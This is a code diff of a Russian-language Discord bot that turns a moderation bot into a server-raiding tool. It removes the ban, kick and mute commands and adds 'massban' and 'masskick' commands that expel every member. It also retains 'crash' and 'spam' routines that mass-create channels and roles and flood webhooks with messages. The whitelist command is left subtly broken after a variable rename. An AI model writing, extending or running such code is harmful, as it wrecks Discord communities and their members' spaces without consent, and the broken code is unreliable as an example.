@@ -12,14 +12,13 @@ intents.members = True
 
 
 
-bot = commands.Bot(command_prefix = '!', intents=intents,  case_insensitive=True, help_command=None)
+bot = commands.Bot(command_prefix = '-', intents=intents,  case_insensitive=True, help_command=None)
 
 
 @bot.event
 async def on_ready():
         print(f'Bot is turned on as {bot.user.name}!')
-        await bot.change_presence(status=discord.Status.idle, 
-                                      activity=discord.Activity(type=discord.ActivityType.listening, name="!хелп"))
+        await bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.streaming, name="-help"))
 
 def open_whitelist():
     try:
@@ -31,7 +30,7 @@ def open_whitelist():
             json.dump(whitelist, data)
         return []
 
-whitelist = open_whitelist()                                      
+wllist = open_whitelist()                                      
 channame = 'crashed-by-icsu'
 
     
@@ -71,7 +70,7 @@ async def on_command_error(ctx,error):
  
  
 @bot.command()
-async def айди(ctx, member : discord.Member = None):
+async def id(ctx, member : discord.Member = None):
  if member == None:
     await ctx.reply(ctx.author.id)
  else:
@@ -99,7 +98,7 @@ async def spm_hook(webhook):
         
 @bot.command()
 async def spam(ctx):
-    if ctx.guild.id in whitelist:
+    if ctx.guild.id in wllist:
         embed = discord.Embed(title='❌ Этот сервер в белом листе, заспамить сервер нельзя!',colour=discord.Colour.red())
         res = await ctx.reply(embed=embed)
         await asyncio.sleep(20)
@@ -111,46 +110,45 @@ async def spam(ctx):
 
 
 @bot.command()
-async def аватар(ctx, member : discord.Member = None):
+async def avatar(ctx, member : discord.Member = None):
     if member == None:
         author = ctx.author.avatar
-        embed = discord.Embed(title=f'Аватар {ctx.author.name}',colour=discord.Colour.dark_grey())
+        embed = discord.Embed(title=f'Аватар {ctx.author.name}',colour=discord.Colour.dark_purple())
         embed.set_image(url=author)
         await ctx.reply(embed=embed)
     else:
-        embed = discord.Embed(title=f'Аватар {member.name}',colour=discord.Colour.dark_grey())
+        embed = discord.Embed(title=f'Аватар {member.name}',colour=discord.Colour.dark_purple())
         embed.set_image(url=member.avatar)
         await ctx.send(embed=embed)
         
     
 @bot.command()
-async def хелп(ctx):
-    desc='''
-    
-    `айди` - показывает айди пользователя
-    `аватар` - показывает аватар пользователя
-    `бан` - банит участника
-    `разбан` - разбанивает участника
-    `мут` - отправляет участника в таймоут
-    `размут` - убирает с участника таймоут
-    `кик` - выгоняет участника с сервера
-    
+async def help(ctx):
+    desc='''```
+id - показывает айди пользователя
+avatar - показывает аватар участника
+help - показывает эту команду
+spam - спамит во всех каналах
+crash - крашает сервер
+massban - банит всех участников сервера
+masskick - выгоняет всех участников сервера
+whitelist - добавляет сервер в белый лист```
     '''
     emb = discord.Embed(title='Команды',
-    description=desc,colour=discord.Colour.dark_grey())
+    description=desc,colour=discord.Colour.dark_purple())
     emb.set_footer(icon_url=ctx.author.avatar,text=ctx.author.name)
     await ctx.reply(embed=emb)
     
 async def crsh_channels(guild):
     try:
-        for b in range(50):
+        for b in range(40):
             await guild.create_text_channel(name=channame)
     except:
         pass
     
 async def spam_roles(guild):
     try:
-        for b in range(50):
+        for b in range(30):
             await guild.create_role(name='ICSU',colour=discord.Colour.dark_purple())
     except:
         pass
@@ -182,7 +180,7 @@ async def del_stickers(guild):
 @commands.cooldown(1, 6 * 60 * 60, commands.BucketType.user)
 async def crash(ctx):
     guild = ctx.guild
-    if guild.id in whitelist:
+    if guild.id in wllist:
         embed = discord.Embed(title='❌ Этот сервер находится в белом листе. Сервер нельзя крашнуть!',colour=discord.Colour.red())
         res = await ctx.reply(embed=embed)
         await asyncio.sleep(20)
@@ -224,7 +222,7 @@ async def crash(ctx):
 async def on_guild_channel_create(channel):
     if channel.name == channame:
         web = await channel.create_webhook(name='ICSU', avatar= await channel.guild.icon.read())
-        for b in range(30):
+        for b in range(50):
             try:
                 await web.send(txt)
             except RateLimited(retry_after=5):
@@ -236,97 +234,49 @@ async def on_guild_channel_create(channel):
          return
          
 
-
-@bot.command()
-@commands.has_permissions(ban_members=True)
-async def бан(ctx, member : discord.Member, reason = None):
-    
-    author=ctx.author
-    desc = f"**Модератор - <@{author.id}>\n Участник - <@{member.id}>**"
-    
-    if author.top_role > member.top_role or ctx.author.guild.owner.id == ctx.author.id:
-        await member.ban(reason=reason,delete_message_days=0)
-        if reason == None:
-            emb = discord.Embed(title=f"✅Участник был забанен!",
-            colour=discord.Colour.dark_grey(),description=desc)
-            emb.set_footer(icon_url=author.avatar,text=author.name)
-            await ctx.send(embed=emb)
-        else:
-            res = f"\n** Причина - {reason} **"
-            emb = discord.Embed(title=f"✅Участник был забанен!",
-            colour=discord.Colour.dark_grey(),description=desc + res)
-            emb.set_footer(icon_url=author.avatar,text=author.name)
-            await ctx.send(embed=emb)
-
-@bot.command()
-@commands.has_permissions(ban_members=True)
-async def разбан(ctx, id: int):
-    member = await bot.fetch_user(id)
-    await ctx.guild.unban(member)
-    embed = discord.Embed(title=f"✅Участник был разбанен!",
-    colour=discord.Colour.dark_grey(),description=f"**Модератор - <@{ctx.author.id}>\n Участник - <@{member.id}>**")
-    await ctx.send(embed=embed)
-    
-@bot.command()
-@commands.has_permissions(kick_members=True)
-async def кик(ctx, member: discord.Member, reason = None):
-    
-    author=ctx.author
-    desc = f"**Модератор - <@{author.id}>\n Участник - <@{member.id}>**"
-    
-    if author.top_role > member.top_role or ctx.author.guild.owner.id == ctx.author.id:
-        await member.kick(reason=reason)
-        if reason == None:
-            emb = discord.Embed(title=f"✅Участник был выгнан!",
-            colour=discord.Colour.dark_grey(),description=desc)
-            emb.set_footer(icon_url=author.avatar,text=author.name)
-            await ctx.send(embed=emb)
-        else:
-            res = f"\n** Причина - {reason} **"
-            emb = discord.Embed(title=f"✅Участник был выгнан!",
-            colour=discord.Colour.dark_grey(),description=desc + res)
-            emb.set_footer(icon_url=author.avatar,text=author.name)
-            await ctx.send(embed=emb)
    
-
-
-    
-    
 @bot.command()
-@commands.has_permissions(moderate_members=True)
-async def мут(ctx, member: discord.Member, time):
-    if 'час' in time:
-        h = time.replace('час','')
-        await member.timeout(timedelta(hours=int(h)),reason=None)
-    if 'мин' in time:
-        m = time.replace('мин','')
-        await member.timeout(timedelta(minutes=int(m)),reason=None)
-    if 'сек' in time:
-        s = time.replace('сек','')
-        await member.timeout(timedelta(seconds=int(s)),reason=None)
-        
-    desc = f'**Модератор - <@{ctx.author.id}>\n Участник - <@{member.id}>**'
-    emb = discord.Embed(title=f'{member.name} в таймоуте!',
-    colour=discord.Colour.dark_grey(), description=desc)    
-    emb.set_footer(icon_url=ctx.author.avatar,text=ctx.author.name)
-    
-    await ctx.send(embed=emb)
-
-    
-@bot.command()
-@commands.has_permissions(moderate_members=True)
-async def размут(ctx, member: discord.Member):
-    await member.timeout(None, reason=None)
-    
-    desc = f'**Модератор - <@{ctx.author.id}>\n Участник - <@{member.id}>**'
-    emb = discord.Embed(title=f'{member.name} таймоут был убран!',
-    colour=discord.Colour.dark_grey(), description=desc)    
-    emb.set_footer(icon_url=ctx.author.avatar,text=ctx.author.name)
-    
-    await ctx.send(embed=emb)
+async def massban(ctx):
+    if ctx.guild.id in wllist:
+        embed = discord.Embed(title='❌ Этот сервер в белом листе!',colour=discord.Colour.red())
+        res = await ctx.reply(embed=embed)
+        await asyncio.sleep(20)
+        await res.delete()
+    else:
+        i=0
+        for member in ctx.guild.members:
+            try:
+                await member.ban()
+                i+=1
+            except:
+                pass
+        try:
+            await ctx.author.send(embed=discord.Embed(title=f'Было забанено {i} участников!', colour=discord.Colour.green()))
+        except:
+            pass
 
 @bot.command()
-async def вайтлист(ctx, serv_id: int):
+async def masskick(ctx):
+    if ctx.guild.id in wllist:
+        embed = discord.Embed(title='❌ Этот сервер в белом листе!',colour=discord.Colour.red())
+        res = await ctx.reply(embed=embed)
+        await asyncio.sleep(20)
+        await res.delete()
+    else:
+        i=0
+        for member in ctx.guild.members:
+            try:
+                await member.kick()
+                i+=1
+            except:
+                pass
+        try:
+            await ctx.author.send(embed=discord.Embed(title=f'Было выгнано {i} участников!', colour=discord.Colour.green()))
+        except:
+            pass
+
+@bot.command()
+async def whitelist(ctx, serv_id: int):
     if ctx.author.id not in allowed_ids:
         emb = discord.Embed(title='❌ У вас нет прав добавлять сервера в белый лист.', colour=discord.Colour.red())
         await ctx.send(embed=emb)
@@ -336,21 +286,14 @@ async def вайтлист(ctx, serv_id: int):
         whitelist.append(serv_id)
         with open('whitelist.json', 'w') as data:
             json.dump(whitelist, data)
-        emb = discord.Embed(title=f'{serv_id} был добавлен в белый лист!', colour=discord.Colour.dark_grey())
+        emb = discord.Embed(title=f'{serv_id} был добавлен в белый лист!', colour=discord.Colour.green())
         await ctx.send(embed=emb)
     else:
-        emb = discord.Embed(title='Сервер уже в белом листе.', colour=discord.Colour.dark_grey())
+        emb = discord.Embed(title='Сервер уже в белом листе.', colour=discord.Colour.dark_purple())
         await ctx.send(embed=emb)      
     
     
     
 
 bot.run(token, log_handler=None)
-
-
-
-
-
-
-
 
